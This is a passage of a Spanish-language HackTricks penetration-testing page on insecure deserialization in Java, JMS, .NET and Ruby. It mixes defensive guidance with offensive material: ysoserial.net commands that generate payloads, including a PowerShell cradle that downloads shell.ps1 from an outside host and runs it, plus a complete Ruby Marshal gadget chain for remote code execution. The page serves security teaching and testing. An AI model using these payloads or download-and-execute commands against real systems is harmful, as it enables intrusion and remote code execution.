La idea general es sobrescribir [`ObjectInputStream.html#resolveClass()`](https://docs.oracle.com/javase/7/docs/api/java/io/ObjectInputStream.html#resolveClass\(java.io.ObjectStreamClass\)) para restringir qu√© clases se permiten deserializar.

Dado que esta llamada ocurre antes de que se llame a `readObject()`, puedes estar seguro de que no ocurrir√° ninguna actividad de deserializaci√≥n a menos que sea del tipo que deseas permitir.

Un ejemplo simple se muestra aqu√≠, donde la clase `LookAheadObjectInputStream` est√° garantizada para no deserializar ning√∫n otro tipo aparte de la clase `Bicycle`:
```java
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Fortalecer el uso de java.io.ObjectInputStream con un Agente**

Si no eres el propietario del c√≥digo o no puedes esperar a un parche, utilizar un agente para incorporar fortalecimiento a `java.io.ObjectInputStream` es la mejor soluci√≥n.\
Utilizando este enfoque, solo puedes incluir en la lista negra los tipos maliciosos conocidos y no incluirlos en la lista blanca, ya que no sabes qu√© objetos se est√°n serializando.

Para habilitar estos agentes, simplemente agrega un nuevo par√°metro JVM:
```
-javaagent:name-of-agent.jar
```
### Referencias

* Charla sobre deserializaci√≥n y ysoserial: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Charla sobre gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) y diapositivas: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Documento de Marshalsec: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Documento sobre deserializaci√≥n en Java y .Net: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** charla: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) y diapositivas: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* CVEs de deserializaci√≥n: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## Inyecci√≥n de JNDI y log4Shell

Encuentra qu√© es **la inyecci√≥n de JNDI, c√≥mo abusar de ella a trav√©s de RMI, CORBA y LDAP y c√≥mo explotar log4shell** (y un ejemplo de esta vulnerabilidad) en la siguiente p√°gina:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> La API de **Java Message Service** (**JMS**) es una API de middleware orientada a mensajes en Java para enviar mensajes entre dos o m√°s clientes. Es una implementaci√≥n para manejar el problema del productor-consumidor. JMS es parte de Java Platform, Enterprise Edition (Java EE) y fue definido por una especificaci√≥n desarrollada en Sun Microsystems, pero que desde entonces ha sido guiada por el Java Community Process. Es un est√°ndar de mensajer√≠a que permite a los componentes de aplicaciones basadas en Java EE crear, enviar, recibir y leer mensajes. Permite que la comunicaci√≥n entre diferentes componentes de una aplicaci√≥n distribuida sea d√©bilmente acoplada, confiable y as√≠ncrona. (De [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Productos

Hay varios productos que utilizan este middleware para enviar mensajes:

![](<../../.gitbook/assets/image (291).png>)

![](<../../.gitbook/assets/image (292).png>)

### Explotaci√≥n

Entonces, b√°sicamente hay **varios servicios que utilizan JMS de manera peligrosa**. Por lo tanto, si tienes **suficientes privilegios** para enviar mensajes a estos servicios (generalmente necesitar√°s credenciales v√°lidas), podr√≠as ser capaz de enviar **objetos maliciosos serializados que ser√°n deserializados por el consumidor/suscriptor**.\
Esto significa que en esta explotaci√≥n, todos los **clientes que vayan a utilizar ese mensaje se infectar√°n**.

Debes recordar que incluso si un servicio es vulnerable (porque deserializa de manera insegura la entrada del usuario), a√∫n necesitas encontrar gadgets v√°lidos para explotar la vulnerabilidad.

La herramienta [JMET](https://github.com/matthiaskaiser/jmet) fue creada para **conectar y atacar estos servicios enviando varios objetos maliciosos serializados utilizando gadgets conocidos**. Estos exploits funcionar√°n si el servicio a√∫n es vulnerable y si alguno de los gadgets utilizados est√° dentro de la aplicaci√≥n vulnerable.

### Referencias

* Charla sobre JMET: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Diapositivas: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

.Net es similar a Java en cuanto a c√≥mo funcionan los exploits de deserializaci√≥n: El **exploit** abusar√° de gadgets que **ejecutan** alg√∫n c√≥digo interesante cuando se **deserializa** un objeto.
### Huella digital

#### WhiteBox

Busque en el c√≥digo fuente los siguientes t√©rminos:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Busque cualquier serializador donde el tipo sea establecido por una variable controlada por el usuario.

#### BlackBox

Puede buscar la cadena codificada en Base64 **AAEAAAD/////** u cualquier otra cosa que **pueda ser deserializada** en el backend y que le permita controlar el tipo deserializado. Por ejemplo, un **JSON** o **XML** que contenga `TypeObject` o `$type`.

### ysoserial.net

En este caso, puede utilizar la herramienta [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) para **crear exploits de deserializaci√≥n**. Una vez descargado el repositorio de git, debe **compilar la herramienta** utilizando Visual Studio, por ejemplo.

Si desea aprender sobre **c√≥mo ysoserial.net crea su exploit**, puede [**consultar esta p√°gina donde se explica el gadget ObjectDataProvider + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Las opciones principales de **ysoserial.net** son: **`--gadget`**, **`--formatter`**, \*\*`--output` \*\* y **`--plugin`.**

* **`--gadget`** se utiliza para indicar el gadget a abusar (indique la clase/funci√≥n que se abusar√° durante la deserializaci√≥n para ejecutar comandos).
* **`--formatter`**, se utiliza para indicar el m√©todo para serializar el exploit (debe saber qu√© biblioteca est√° utilizando el backend para deserializar la carga √∫til y utilizar la misma para serializarla).
* \*\*`--output` \*\* se utiliza para indicar si desea el exploit en formato **raw** o codificado en Base64. _Tenga en cuenta que **ysoserial.net** codificar√° la carga √∫til utilizando **UTF-16LE** (codificaci√≥n utilizada de forma predeterminada en Windows), por lo que si obtiene el formato raw y simplemente lo codifica desde una consola de Linux, es posible que tenga algunos problemas de **compatibilidad de codificaci√≥n** que evitar√°n que el exploit funcione correctamente (en el HTB JSON box, la carga √∫til funcion√≥ tanto en UTF-16LE como en ASCII, pero esto no significa que siempre funcionar√°)._
* \*\*`--plugin` \*\* ysoserial.net admite complementos para crear **exploits para frameworks espec√≠ficos** como ViewState.

#### M√°s par√°metros de ysoserial.net

* `--minify` proporcionar√° una carga √∫til **m√°s peque√±a** (si es posible).
* `--raf -f Json.Net -c "anything"` Esto indicar√° todos los gadgets que se pueden utilizar con un formateador proporcionado (`Json.Net` en este caso).
* `--sf xml` puede **indicar un gadget** (`-g`) y ysoserial.net buscar√° formateadores que contengan "xml" (sin distinci√≥n de may√∫sculas y min√∫sculas).

**Ejemplos de ysoserial.net** para crear exploits:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** tambi√©n tiene un par√°metro muy interesante que ayuda a comprender mejor c√≥mo funciona cada exploit: `--test`. Si indicas este par√°metro, **ysoserial.net** intentar√° el exploit localmente, para que puedas probar si tu carga √∫til funcionar√° correctamente. Este par√°metro es √∫til porque si revisas el c√≥digo, encontrar√°s fragmentos de c√≥digo como el siguiente (de [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Esto significa que para probar el exploit, el c√≥digo llamar√° a [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
En el **c√≥digo anterior es vulnerable al exploit creado**. Por lo tanto, si encuentras algo similar en una aplicaci√≥n .Net, significa que probablemente esa aplicaci√≥n tambi√©n es vulnerable.\
Por lo tanto, el par√°metro **`--test`** nos permite entender **qu√© fragmentos de c√≥digo son vulnerables** al exploit de deserializaci√≥n que puede crear **ysoserial.net**.

### ViewState

Echa un vistazo a [este POST sobre **c√≥mo intentar explotar el par√°metro \_\_ViewState de .Net**](exploiting-\_\_viewstate-parameter.md) para **ejecutar c√≥digo arbitrario**. Si **ya conoces los secretos** utilizados por la m√°quina v√≠ctima, [**lee este post para saber c√≥mo ejecutar c√≥digo**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### **Prevenci√≥n**

No permitas que el flujo de datos defina el tipo de objeto al que se deserializar√° el flujo. Puedes prevenir esto utilizando, por ejemplo, `DataContractSerializer` o `XmlSerializer` si es posible.

Donde se est√© utilizando `JSON.Net`, aseg√∫rate de que `TypeNameHandling` solo est√© configurado como `None`.
```
TypeNameHandling = TypeNameHandling.None
```
Si se va a utilizar `JavaScriptSerializer`, no lo utilice con un `JavaScriptTypeResolver`.

Si es necesario deserializar flujos de datos que definen su propio tipo, entonces restrinja los tipos que se permiten deserializar. Uno debe ser consciente de que esto sigue siendo arriesgado, ya que muchos tipos nativos de .Net son potencialmente peligrosos en s√≠ mismos. Por ejemplo,
```
System.IO.FileInfo
```
Los objetos `FileInfo` que hacen referencia a archivos en el servidor pueden, al deserializarse, cambiar las propiedades de esos archivos, como por ejemplo, ponerlos en modo de solo lectura, lo que crea un potencial ataque de denegaci√≥n de servicio.

Incluso si has limitado los tipos que pueden ser deserializados, recuerda que algunos tipos tienen propiedades que representan un riesgo. Por ejemplo, `System.ComponentModel.DataAnnotations.ValidationException` tiene una propiedad `Value` de tipo `Object`. Si este tipo es permitido para la deserializaci√≥n, un atacante puede establecer la propiedad `Value` a cualquier tipo de objeto que elijan.

Se debe evitar que los atacantes puedan controlar el tipo que se instanciar√°. Si esto es posible, incluso `DataContractSerializer` o `XmlSerializer` pueden ser subvertidos.
```
// Action below is dangerous if the attacker can change the data in the database
var typename = GetTransactionTypeFromDatabase();

var serializer = new DataContractJsonSerializer(Type.GetType(typename));

var obj = serializer.ReadObject(ms);
```
La ejecuci√≥n puede ocurrir dentro de ciertos tipos de .Net durante la deserializaci√≥n. Crear un control como el que se muestra a continuaci√≥n es ineficaz.
```
var suspectObject = myBinaryFormatter.Deserialize(untrustedData);

//Check below is too late! Execution may have already occurred.
if (suspectObject is SomeDangerousObjectType)
{
//generate warnings and dispose of suspectObject
}
```
Para `BinaryFormatter` y `JSON.Net`, es posible crear una forma m√°s segura de control de lista blanca utilizando un `SerializationBinder` personalizado.

Mant√©ngase actualizado sobre los gadgets de deserializaci√≥n inseguros conocidos de .Net y preste especial atenci√≥n a los lugares donde dichos tipos pueden ser creados por sus procesos de deserializaci√≥n. **Un deserializador solo puede instanciar tipos que conoce**.

Mantenga cualquier c√≥digo que pueda crear gadgets potenciales separado de cualquier c√≥digo que tenga conectividad a Internet. Como ejemplo, `System.Windows.Data.ObjectDataProvider` utilizado en aplicaciones WPF es un gadget conocido que permite la invocaci√≥n arbitraria de m√©todos. Ser√≠a arriesgado tener una referencia a este ensamblado en un proyecto de servicio REST que deserializa datos no confiables.

### **Referencias**

* Documento sobre deserializaci√≥n JSON en Java y .Net: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** charla: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) y diapositivas: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Ruby tiene dos m√©todos para implementar la serializaci√≥n dentro de la biblioteca **marshal**: el primer m√©todo es **dump** que convierte un objeto en una secuencia de bytes **(serializar)**. Y el segundo m√©todo es **load** para convertir la secuencia de bytes nuevamente en un objeto (**deserializar**).\
Ruby utiliza HMAC para firmar el objeto serializado y guarda la clave en uno de los siguientes archivos:

* config/environment.rb
* config/initializers/secret\_token.rb
* config/secrets.yml
* /proc/self/environ

Cadena de gadgets de deserializaci√≥n gen√©rica de Ruby 2.X a RCE (m√°s informaci√≥n en [https://www.elttam.com/blog/ruby-deserialization/](https://www.elttam.com/blog/ruby-deserialization/)):
```ruby
#!/usr/bin/env ruby

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Otra cadena de RCE para explotar Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
